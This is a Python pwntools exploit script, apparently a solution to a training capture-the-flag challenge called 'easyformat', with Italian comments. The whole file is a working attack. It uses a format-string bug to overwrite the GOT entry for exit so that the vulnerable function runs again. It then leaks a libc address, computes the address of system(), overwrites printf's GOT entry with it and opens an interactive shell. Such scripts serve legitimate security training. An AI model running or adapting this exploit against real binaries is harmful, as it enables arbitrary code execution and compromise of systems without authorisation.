from pwn import *

p = remote('training.jinblack.it', 2008)
f = elf.ELF('./easyformat')
libc = elf.ELF('./libc-2.27.so')

raw_input()
displacement = 4 #devo trovarlo
#format string + padding + shellcode 
#il where lo troviamo nel decompiler nella got.plt table
exitGot = f.got['exit']
printfGot = f.got['printf']
vulnSymbol = f.symbols["vuln"] 
libcStartMainOffset = libc.symbols['__libc_start_main']

def calculateFormatString(whatToWrite, whereToWrite, displacement):
	if(whatToWrite >> 16) > (whatToWrite & 0xffff):
		firstAddr = whereToWrite
		secondAddr = whereToWrite + 2
		firstHalf = whatToWrite & 0xffff
		secondHalf = whatToWrite >> 16
	else:
		firstAddr = whereToWrite + 2
		secondAddr = whereToWrite
		firstHalf = whatToWrite >> 16
		secondHalf = whatToWrite & 0xffff
	return p32(firstAddr) + p32(secondAddr) + \
	"%{}c%{}$hn".format(firstHalf - 8, displacement) + \
	"%{}c%{}$hn".format(secondHalf - firstHalf, displacement + 1)

p.sendline(calculateFormatString(vulnSymbol, exitGot, displacement) + "%75$x")

#s contains the address of libc
s = p.readline().strip()[-8:].decode("hex")
log.info("libc dynamic address>>" + hex(u32(s, endianness='big')))

libcBase = u32(s, endianness='big') - libcStartMainOffset - 241 #DEVO CAPIRE BENE QUESTO 241
systemAddr = libcBase + libc.symbols['system']

log.info("libcBase address >> " + hex(libcBase))
log.info("systemAddr >> " + hex(systemAddr))

p.sendline(calculateFormatString(systemAddr, printfGot, displacement))

p.interactive()